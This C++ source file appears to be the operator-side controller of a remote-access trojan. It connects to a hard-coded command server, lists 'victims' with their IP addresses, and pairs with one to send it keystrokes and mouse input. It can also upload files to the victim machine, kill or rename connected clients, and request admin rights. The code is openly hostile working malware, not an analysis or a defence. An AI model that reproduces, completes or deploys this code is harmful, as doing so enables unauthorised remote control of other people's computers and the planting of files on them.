#include "controller.h"

Controller::Controller()
{    
    font.loadFromFile("./font.ttf");
    //if needed create the file
    std::ofstream createFile("./ccontext.txt", std::ios::app);
    createFile.close();
    //read the context file
    std::ifstream readFile("./ccontext.txt");
    getline(readFile, name);

    //remove spaces before and after name
    while (name.size() > 0 && name[0] == ' ')
        name.erase(name.begin());
    while (name.size() > 0 && name[name.size() - 1] == ' ')
        name.erase(name.begin() + name.size() - 1);
    readFile.close();

    //connect and initialize connection with server
    connectServer();

    //receive packets from array
    std::thread receive(&Controller::receiveInfo, this);
    receive.detach();

    //take user input from console
    std::thread input(&Controller::takeCmdInput, this);
    input.detach();
}
void Controller::controlWindow()
{
    auto screenSize = Mlib::displaySize();

    //set all keys to the current key states
    bool keys[256];
    for (int i = 0; i < 256; i++)
        keys[i] = Mlib::Keyboard::isKeyPressed(Mlib::Keyboard::Key(i));

    while (isRunning) {
        //send signal to server to keep awake
        if (Mlib::currentTime().asMil() - lastAwakeSignal > 2'000) {
            sf::Packet p;
            p << sf::Uint8('r');
            sendServer(p);
            lastAwakeSignal = Mlib::currentTime().asMil();
        }

        //open window - connect server - skip
        if (!w.isOpen()) {
            //open window if needed
            if (isRunning && isConnected && isPaired && isControlling) {
                w.create(sf::VideoMode::getFullscreenModes()[0], "Controller", sf::Style::Fullscreen);
                w.setView(sf::View(sf::Vector2f(960, 540), sf::Vector2f(1920, 1080)));
                w.setFramerateLimit(20);

                if (!wallpaper.loadFromFile("./wallpaper.png")) {
                    sf::Image img;
                    img.create(w.getSize().x, w.getSize().y, sf::Color::Black);
                    wallpaper.loadFromImage(img);
                }   
            }
            //reconnect with server if needed
            else if (isRunning && !isConnected) {
                std::cout << "DISCONNECTED FROM SERVER\n";
                controllers.clear();
                victims.clear();
                connectServer();
                std::thread receive(&Controller::receiveInfo, this);
                receive.detach();
            }
            //sleep for a bit and continue
            else {
                Mlib::sleep(Mlib::milliseconds(50));
                continue;
            }
        }
        //close window if not controlling
        else if (!isControlling || !isPaired) {
            w.close();
            //stop controlling keyboard
            if (sendKeys) {
                sf::Packet p;
                p << sf::Uint8('z');
                sendServer(p);
            }
            //stop controlling mouse
            if (sendMouse) {
                sf::Packet p;
                p << sf::Uint8('x');
                sendServer(p);
            }
        }

        //catch windows events
        sf::Event e;
        while (w.pollEvent(e)) {
            if (e.type == sf::Event::Closed) {
                w.close();
                isControlling = false;
                //stop controlling keyboard
                if (sendKeys) {
                    sf::Packet p;
                    p << sf::Uint8('z');
                    sendServer(p);
                }
                //stop controlling mouse
                if (sendMouse) {
                    sf::Packet p;
                    p << sf::Uint8('x');
                    sendServer(p);
                }
            }
            else if (e.type == sf::Event::MouseWheelScrolled && sendMouse && !areSettingsOpen)
            {
                sf::Packet p;
                p << sf::Uint8('k') << sf::Int8(e.mouseWheelScroll.delta);
                sendServer(p);
            }   
        }

        //open/close settings
        bool insState = Mlib::Keyboard::isKeyPressed(Mlib::Keyboard::Key(0x2D));
        if (insState && !keys[0x2D]) {
            areSettingsOpen = true;
            if (sendKeys) {
                sf::Packet p;
                p << sf::Uint8('z');
                sendServer(p);
            }
        }
        else if (!insState && keys[0x2D]) {
            areSettingsOpen = false;
            if (sendKeys) {
                sf::Packet p;
                p << sf::Uint8('a');
                sendServer(p);
            }
        }
        keys[0x2D] = insState;

        //send mouse position if needed
        auto mousePos = Mlib::Mouse::getPos();
        if (mousePos != lastMousePos && sendMouse) {
            float x = mousePos.x / float(screenSize.x), y = mousePos.y / float(screenSize.y);
            sf::Packet p;
            p << sf::Uint8('l') << sf::Uint16(x * 256 * 256) << sf::Uint16(y * 256 * 256);
            sendServer(p);
        }
        lastMousePos = mousePos;

        //send keys and buttons pressed-released events if needed
        for (int i = 0; i < 256; i++) {
            //skip and ins key
            if (i == 0x2D)
                continue;

            bool state = Mlib::Keyboard::isKeyPressed(Mlib::Keyboard::Key(i));
            bool isMouseButton = (i == 0x01 || i == 0x02 || i == 0x04 || i == 0x05 || i == 0x06);
            bool releaseEvent = Mlib::Keyboard::getAsyncState(Mlib::Keyboard::Key(i));
            if ((!areSettingsOpen && !isMouseButton && sendKeys) || (isMouseButton && sendMouse)) {
                if (!state && keys[i]) {
                    sf::Packet p;
                    p << sf::Uint8('m') << sf::Uint8(i);
                    sendServer(p);
                }
                else if (releaseEvent) {
                    sf::Packet p;
                    p << sf::Uint8('n') << sf::Uint8(i);
                    sendServer(p);
                }
            }
            if (areSettingsOpen && i >= 0x30 && i <= 0x39 && state && !keys[i]) {
                int key = i - 48;
                if (key == 0) {
                    isControlling = false;
                }
                else if (key == 1) {
                    sendMouse = !sendMouse;
                    if (sendMouse) {
                        sf::Packet p;
                        p << sf::Uint8('s');
                        sendServer(p);
                    }
                    else {
                        sf::Packet p;
                        p << sf::Uint8('x');
                        sendServer(p);
                    }
                }
                else if (key == 2) {
                    sendKeys = !sendKeys;
                }
                else if (key == 3 && fileState < 0) {
                    std::thread sendFile(&Controller::startSendingFile, this);
                    sendFile.detach();
                }
            }

            keys[i] = state;
        }

        sf::RectangleShape rect(sf::Vector2f(w.getSize()));
        rect.setTexture(&wallpaper);
        w.draw(rect);

        std::string str("SETTINGS [ins] = ");
        str += ((areSettingsOpen) ? "OPEN\n" : "CLOSED\n");
        str += "MOUSE [1] = ";
        str += ((sendMouse) ? "ACTIVE\n" : "INACTIVE\n");
        str += "KEYBOARD [2] = ";
        str += ((sendKeys) ? "ACTIVE\n" : "INACTIVE\n");
        str += "FILE [3] = ";
        if (fileState == -1)
            str += "READY";
        else if (fileState == -2) 
            str += "SENT - READY";
        else if (fileState == -3)
            str += "FAILED - READY";
        else if (fileState > 0)
            str += std::to_string(fileState) + "/" + std::to_string(fileSize) + 
            " BYTES - " + std::to_string(int((fileState * 100.f) / fileSize)) + "%";

        sf::Text txt(str, font, 20);
        txt.setPosition(8, 6);
        txt.setLineSpacing(1.4);
        w.draw(txt);

        w.display();
    }
}

void Controller::receiveInfo()
{
    while (true) {
        sf::Packet p;
        server.receive(p);
        //disconnect server if packet is invalid
        if (p.getDataSize() == 0) {
            isConnected = false, isPaired = false, isControlling = false;
            break;
        }

        sf::Uint8 cmd;
        p >> cmd;

        std::cout << cmd;

        //add new controller/victim info
        if (cmd == 'n' || cmd == 'l') {
            Client c;
            sf::Uint32 ip;
            p >> c.id >> c.name >> c.time >> ip >> c.port >> c.otherId >> c.isAdmin;
            c.ip = sf::IpAddress(ip).toString();
            if (cmd == 'n')
                cTemp.push_back(c);
            else
                vTemp.push_back(c);
        }
        //display clients info
        else if (cmd == 'd') {
            controllers = cTemp; 
            victims = vTemp;

            cTemp.clear();
            vTemp.clear();

            displayList();
        }
        //apparently controller isn't initialized
        else if (cmd == '?') {
            isConnected = false, isPaired = false, isControlling = false;
            break;
        }
        //pair controller with victim
        else if (cmd == 'p')
        {
            isPaired = true;
            isControlling = false;
        }
        //un-pair controller with victim
        else if (cmd == 'u')
        {
            isPaired = false;
            isControlling = false;
        }
        //exit program
        else if (cmd == 'e') {
            isRunning = false;
        }
        //rename client
        else if (cmd == 'w') {
            p >> name;
            std::ofstream file("./ccontext.txt", std::ios::trunc);
            file.write(name.c_str(), name.size());
            file.close();
        }
        //send next file packet
        else if (cmd == 'y') {
            if (file != nullptr && file->is_open()) {
                char* buffer = new char[20'480];
                file->read(buffer, 20'480);
                size_t bytesRead = file->gcount();

                if (bytesRead > 0) {
                    sf::Packet p;
                    p << sf::Uint8('o');
                    p.append(buffer, bytesRead);
                    sendServer(p);

                    if (fileState <= 0)
                        fileState = static_cast<int>(bytesRead);
                    else
                        fileState += static_cast<int>(bytesRead);
                }
                else {
                    file->close();
                    delete file; 
                    file = nullptr;

                    fileState = -2;
                    p.clear();
                    p << sf::Uint8('i') << ext;
                    sendServer(p);
                }
            }
            else {
                p.clear();
                p << sf::Uint8('h');
                sendServer(p);
            }
        }
        //file fail
        else if (cmd == 'h') {
            if (file == nullptr)
                continue;

            fileState = -3;
            file->close();
            delete file;
            file = nullptr;
        }
    }
}
void Controller::takeCmdInput()
{
    while (true) {
        //take input from console
        std::string cmd;
        getline(std::cin, cmd);

        if (!isConnected)
            continue;

        while (cmd.size() > 0 && cmd[0] == ' ')
            cmd.erase(cmd.begin());
        while (cmd.size() > 0 && cmd[cmd.size() - 1] == ' ')
            cmd.erase(cmd.begin() + cmd.size() - 1);

        //connect to a given victim
        if (cmd.substr(0, 4) == "pair" && !isPaired) {
            cmd.erase(0, 4);

            //convert string to  number and check if it is valid
            int num = 0;
            try {
                num = stoi(cmd);
            } 
            catch (std::invalid_argument e) {
                continue;
            } 
            catch (std::out_of_range e) {
                continue;
            }

            //check if victim with that id exists
            for (const auto& v : victims) {
                if (v.id != num)
                    continue;

                sf::Packet p;
                p << sf::Uint8('p') << v.id;
                sendServer(p);
                break;
            }
        }
        //disconnect from victim
        else if (cmd.substr(0, 6) == "unpair") {
            cmd.erase(0, 6);

            int num = 0;
            try {
                num = stoi(cmd);
            }
            catch (std::invalid_argument e) {
                bool exit = false;
                for (int i = 0; i < cmd.size(); i++) {
                    if (cmd[i] != ' ') {
                        exit = true;
                        break;
                    }
                }

                if (exit)
                    continue;
                else
                    num = id;
            }
            catch (std::out_of_range e) {
                continue;
            }

            //check if client with that id exists
            for (const auto& v : victims) {
                if (v.id != num)
                    continue;
                if (v.otherId == 0)
                    break;

                sf::Packet p;
                p << sf::Uint8('u') << v.id;
                sendServer(p);
                break;
            }
            for (const auto& c : controllers) {
                if (c.id != num)
                    continue; 
                if (c.otherId == 0)
                    break;

                sf::Packet p;
                p << sf::Uint8('u') << c.id;
                sendServer(p);
                break;
            }
        }
        //start controlling the victim
        else if (cmd.substr(0, 7) == "control" && isPaired) {
            Mlib::sleep(Mlib::milliseconds(500));
            isControlling = true, sendKeys = false, sendMouse = false, areSettingsOpen = false;
        }
        //kill a given client
        else if (cmd.substr(0, 4) == "kill") {
            cmd.erase(0, 4);

            //convert string to  number and check if it is valid
            int num = 0;
            try {
                num = stoi(cmd);
            }
            catch (std::invalid_argument e) {
                continue;
            }
            catch (std::out_of_range e) {
                continue;
            }

            //check if client with that id exists
            for (const auto& v : victims) {
                if (v.id != num)
                    continue;

                sf::Packet p;
                p << sf::Uint8('e') << v.id;
                sendServer(p);
                break;
            }
            for (const auto& c : controllers) {
                if (c.id != num)
                    continue;

                sf::Packet p;
                p << sf::Uint8('e') << c.id;
                sendServer(p);
                break;
            }
        }
        //rename a given client
        else if (cmd.substr(0, 4) == "name") {
            cmd.erase(0, 4);
            //check if input is valid
            if (cmd.find(':') == std::string::npos)
                continue;

            //convert string to  number and check if it is valid
            int num = 0;
            try {
                num = stoi(cmd.substr(0, cmd.find(':')));
            }
            catch (std::invalid_argument e) {
                continue;
            }
            catch (std::out_of_range e) {
                continue;
            }

            //remove spaces from before and after the string
            std::string newName = cmd.substr(cmd.find(':') + 1, cmd.size() - 1);
            while (newName.size() > 0 && newName[0] == ' ')
                newName.erase(newName.begin());
            while (newName.size() > 0 && newName[newName.size() - 1] == ' ')
                newName.erase(newName.begin() + newName.size() - 1);

            //check if client with that id exists
            for (const auto& v : victims) {
                if (v.id != num)
                    continue;

                sf::Packet p;
                p << sf::Uint8('w') << v.id << newName;
                sendServer(p);
                break;
            }
            for (const auto& c : controllers) {
                if (c.id != num)
                    continue;

                sf::Packet p;
                p << sf::Uint8('w') << c.id << newName;
                sendServer(p);
                break;
            }
        }
        //ask for admin
        else if (cmd.substr(0, 4) == "pass") {
            cmd.erase(0, 4);
            //check if input is valid
            if (cmd.find(':') == std::string::npos)
                continue;

            //convert string to  number and check if it is valid
            int num = 0;
            try {
                num = stoi(cmd.substr(0, cmd.find(':')));
            }
            catch (std::invalid_argument e) {
                bool exit = false;
                for (int i = 0; i < cmd.find(':'); i++) {
                    if (cmd[i] != ' ') {
                        exit = true;
                        break;
                    }
                }

                if (exit)
                    continue;
                else
                    num = id;
            }
            catch (std::out_of_range e) {
                continue;
            }

            //remove spaces from before and after the string
            std::string pass = cmd.substr(cmd.find(':') + 1, cmd.size() - 1);
            while (pass.size() > 0 && pass[0] == ' ')
                pass.erase(pass.begin());
            while (pass.size() > 0 && pass[pass.size() - 1] == ' ')
                pass.erase(pass.begin() + pass.size() - 1);

            //check if controller with that id exists
            for (const auto& c : controllers) {
                if (c.id != num)
                    continue;

                sf::Packet p;
                p << sf::Uint8('q') << c.id << pass;
                sendServer(p);
                break;
            }
        }
    }
}

void Controller::connectServer()
{
connect:
    //connect to server
    while (server.connect(SERVER_IP, SERVER_PORT) != sf::Socket::Done) {}
    std::cout << "connected with server\n";

    int fails = 0;
init:
    sf::Packet p;
    p << sf::Uint8(CONTROLLER_VERSION) << name;
    //tell server the role and the name
    if (sendServer(p) == sf::Socket::Disconnected)
        goto connect;

    p.clear();
    if (server.receive(p) == sf::Socket::Disconnected)
        goto connect;

    sf::Uint8 version = 0;
    p >> version;
    if (version != CONTROLLER_VERSION) {
        std::cout << int(version) << "\n";
        if (fails < 20) {
            fails++;
            goto init;
        }
        else {
            std::cout << "server rejected the connection. try downloading a newer ";
            std::cout << "controller version from http://34.154.107.102:8000\n";
            while (true)
                Mlib::sleep(Mlib::seconds(10));
        }
    }

    //get the connection id
    p >> id;
    std::cout << "connection with server approved\n";

    isConnected = true;
}
void Controller::displayList()
{
    system("CLS");
    std::cout << "last update time: " << int(Mlib::currentTime().asSec()) << " - id: " << id << "\n\n";

    std::cout << "CONTROLLERS:\n";
    //output information for each controller
    for (const auto& c : controllers) {
        std::cout << "   id: " << c.id << " [" << c.name << "]";
        if (c.id == id)
            std::cout << " (you)";
        std::cout << " = " << c.ip << ':' << c.port << " - time: " << c.time;
        if (c.otherId == 0)
            std::cout << " - not paired";
        else
            std::cout << " - paired with " << c.otherId;

        if (c.isAdmin)
            std::cout << " - ADMIN";
        std::cout << "\n";
    }

    std::cout << "\nVICTIMS:\n";
    //output information for each victim
    for (const auto& v : victims) {
        std::cout << "   id: " << v.id << " [" << v.name << "] = " << v.ip << ':' << v.port << " - time: " << v.time;
        if (v.otherId == 0)
            std::cout << " - not paired\n";
        else {
            std::cout << " - paired with " << v.otherId;
            if (v.otherId == id)
                std::cout << " (you)";
            std::cout << '\n';
        }
    }
    std::cout << '\n';
}

void Controller::startSendingFile()
{        
    std::string path = Mlib::getOpenFilePath("All Files (*.*)\0*.*\0");
    file = new std::ifstream(path, std::ios::binary | std::ios::in);
    if (!file->is_open())
        return;

    file->ignore(std::numeric_limits<std::streamsize>::max());
    fileSize = file->gcount();
    file->seekg(0);

    ext = path.substr(path.find_first_of('.'));

    sf::Packet p;
    p << sf::Uint8('f');
    sendServer(p);
}

sf::Socket::Status Controller::sendServer(sf::Packet& p)
{
    mutex.lock();
    auto state = server.send(p);
    mutex.unlock();

    return state;
}
